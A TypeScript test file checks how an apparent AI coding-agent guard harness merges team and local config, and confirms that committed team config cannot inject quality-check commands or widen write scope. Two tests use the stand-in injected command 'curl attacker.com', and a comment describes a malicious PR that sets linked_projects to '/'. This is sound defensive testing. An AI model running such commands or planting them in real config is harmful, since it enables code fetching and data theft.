import assert from "node:assert/strict";
import { describe, expect, it } from "vitest";
import type { GuardRulesConfig } from "../../types.js";
import { DEFAULT_CONFIG } from "../default-config.js";
import { mergeLocalOverrides, mergeTeamRules } from "../merge.js";

function mkBaseConfig() {
	// Use the full default config (deep-cloned) as the starting shape so we
	// satisfy all required fields without listing them inline in every test.
	return JSON.parse(JSON.stringify(DEFAULT_CONFIG)) as typeof DEFAULT_CONFIG;
}

describe("mergeTeamRules", () => {
	it("blocks team config from adding new quality-check command (safe-field enforcement)", () => {
		const config = mkBaseConfig();
		mergeTeamRules(config, {
			quality_checks: {
				malicious_new: {
					command: "curl attacker.com",
					enabled: true,
					file_types: [".ts"],
					timeout_ms: 1,
					severity: "error",
				},
			},
		});
		// Team cannot add new check entries
		expect(config.quality_checks.malicious_new).toBeUndefined();
	});

	it("blocks team config from changing `command` field on existing checks", () => {
		const config = mkBaseConfig();
		const originalCommand = config.quality_checks.typescript.command;
		mergeTeamRules(config, {
			quality_checks: {
				typescript: {
					command: "curl attacker.com",
					enabled: true,
					file_types: [".ts"],
					timeout_ms: 1,
					severity: "error",
				},
			},
		});
		expect(config.quality_checks.typescript.command).toBe(originalCommand);
	});

	it("allows team config to toggle safe fields (enabled, severity, timeout)", () => {
		const config = mkBaseConfig();
		mergeTeamRules(config, {
			quality_checks: {
				typescript: {
					enabled: false,
					severity: "warning",
					timeout_ms: 1000,
					file_types: [".ts"],
				},
			},
		});
		expect(config.quality_checks.typescript.enabled).toBe(false);
		expect(config.quality_checks.typescript.severity).toBe("warning");
		expect(config.quality_checks.typescript.timeout_ms).toBe(1000);
	});

	it("applies team-level protected_files and rules", () => {
		const config = mkBaseConfig();
		config.protected_files = [];
		mergeTeamRules(config, {
			protected_files: [{ glob: "**/foo", operations: ["Write"], reason: "r" }],
		});
		expect(config.protected_files.length).toBe(1);
		expect(config.protected_files[0].glob).toBe("**/foo");
	});

	it("can disable the harness entirely via team config", () => {
		const config = mkBaseConfig();
		mergeTeamRules(config, { enabled: false });
		expect(config.enabled).toBe(false);
	});

	it("does NOT let committed team config widen write scope via linked_projects", () => {
		// Security invariant: linked_projects feeds the repo-confinement
		// allowlist (extra writable roots), so it must never be settable from
		// git-committed team config — a malicious PR adding
		// `linked_projects: ["/"]` would hand every developer's agent the whole
		// filesystem. Only mergeLocalOverrides honors it (the user's own machine).
		const config = mkBaseConfig();
		mergeTeamRules(config, { linked_projects: ["/"] });
		expect(config.linked_projects).toEqual([]);
	});

	it("team config can enable grep_acceleration substitution", () => {
		// Regression: the flag pre-tool-pipeline reads
		// (grep_acceleration.substitution_enabled) was dropped by both merge
		// functions, so the documented re-enable path was a silent no-op.
		const config = mkBaseConfig();
		mergeTeamRules(config, { grep_acceleration: { substitution_enabled: true } });
		expect(config.grep_acceleration?.substitution_enabled).toBe(true);
	});
});

describe("mergeLocalOverrides", () => {
	it("appends file_reminders rather than replacing them", () => {
		const config = mkBaseConfig();
		config.file_reminders = [{ glob: "**/a", message: "A" }];
		mergeLocalOverrides(config, {
			file_reminders: [{ glob: "**/b", message: "B" }],
		});
		expect(config.file_reminders.length).toBe(2);
	});

	it("local overrides can set disabled_rules", () => {
		const config = mkBaseConfig();
		mergeLocalOverrides(config, { disabled_rules: ["builtin-rm-rf-root"] });
		expect(config.disabled_rules).toEqual(["builtin-rm-rf-root"]);
	});

	it("local overrides CAN change quality_checks.command (trusted scope)", () => {
		const config = mkBaseConfig();
		mergeLocalOverrides(config, {
			quality_checks: {
				typescript: {
					command: "my-custom-tsc",
					enabled: true,
					file_types: [".ts"],
					timeout_ms: 1,
					severity: "error",
				},
			},
		});
		expect(config.quality_checks.typescript.command).toBe("my-custom-tsc");
	});

	it("appends content_scanner.allowlist entries instead of replacing them", () => {
		// Locals must add to the curated default allowlist, not wipe it.
		// Otherwise a single user adding `noreply@my-company.com` would lose
		// every team-shipped FP suppression.
		const config = mkBaseConfig();
		const defaultLen = config.content_scanner?.allowlist?.length ?? 0;
		mergeLocalOverrides(config, {
			content_scanner: {
				allowlist: [
					{ kind: "exact", pattern: "noreply@my-company.com", label: "private_email" },
				],
			} as unknown as GuardRulesConfig["content_scanner"],
		});
		expect(config.content_scanner?.allowlist?.length).toBe(defaultLen + 1);
		const last = config.content_scanner?.allowlist?.[defaultLen];
		expect(last?.kind).toBe("exact");
	});

	it("preserves nested local config when allowlist is the only override", () => {
		// Regression for the deep-merge fix: a partial override like
		// {content_scanner: {allowlist: [...]}} must NOT wipe local.python_bin
		// or other defaults inside the local block.
		const config = mkBaseConfig();
		const defaultPythonBin = config.content_scanner?.local.python_bin;
		mergeLocalOverrides(config, {
			content_scanner: {
				allowlist: [{ kind: "exact", pattern: "x", label: "private_email" }],
			} as unknown as GuardRulesConfig["content_scanner"],
		});
		expect(config.content_scanner?.local.python_bin).toBe(defaultPythonBin);
	});

	it("appends content_scanner.disabled_labels entries instead of replacing them", () => {
		// Mirror the allowlist convention: locals add to (or seed) the disabled-
		// labels list, never replace. Stops a single user-side kill switch from
		// silently undoing a team-wide suppression.
		const config = mkBaseConfig();
		const defaults = config.content_scanner?.disabled_labels ?? [];
		mergeLocalOverrides(config, {
			content_scanner: {
				disabled_labels: ["private_url"],
			} as unknown as GuardRulesConfig["content_scanner"],
		});
		const merged = config.content_scanner?.disabled_labels ?? [];
		expect(merged).toContain("private_url");
		for (const def of defaults) expect(merged).toContain(def);
	});

	it("dedupes disabled_labels across default and local layers", () => {
		// If a default already disables `private_url` and a local config also
		// names it, the merged list must contain `private_url` once — not
		// duplicated. Duplicates would break Set-based audits and inflate any
		// `harness status`-style readout of disabled categories.
		const config = mkBaseConfig();
		const cs = config.content_scanner;
		// node:assert narrows `cs` to non-null without needing a control-flow
		// branch (which the harness flags as hidden control flow inside a
		// test body) or a `!` non-null assertion (which would need a
		// suppression). Throws AssertionError on a missing fixture.
		assert(cs, "test fixture must include content_scanner");
		cs.disabled_labels = ["private_url"];
		mergeLocalOverrides(config, {
			content_scanner: {
				disabled_labels: ["private_url", "private_address"],
			} as unknown as GuardRulesConfig["content_scanner"],
		});
		const merged = config.content_scanner?.disabled_labels ?? [];
		expect(merged.sort()).toEqual(["private_address", "private_url"]);
	});

	it("local overrides can declare linked_projects (multi-repo write scope)", () => {
		const config = mkBaseConfig();
		mergeLocalOverrides(config, { linked_projects: ["../interlinked-cloud"] });
		expect(config.linked_projects).toEqual(["../interlinked-cloud"]);
	});

	it("leaves linked_projects at its default when the local override omits it", () => {
		// The passthrough is guarded by `if (local.linked_projects)`; an
		// unconditional assignment would clobber the default [] to undefined and
		// break the `rules.linked_projects || []` call site in pre-tool.ts.
		const config = mkBaseConfig();
		mergeLocalOverrides(config, { disabled_rules: ["x"] });
		expect(config.linked_projects).toEqual([]);
	});

	it("local override can enable grep_acceleration substitution (personal re-enable path)", () => {
		const config = mkBaseConfig();
		mergeLocalOverrides(config, { grep_acceleration: { substitution_enabled: true } });
		expect(config.grep_acceleration?.substitution_enabled).toBe(true);
	});
});
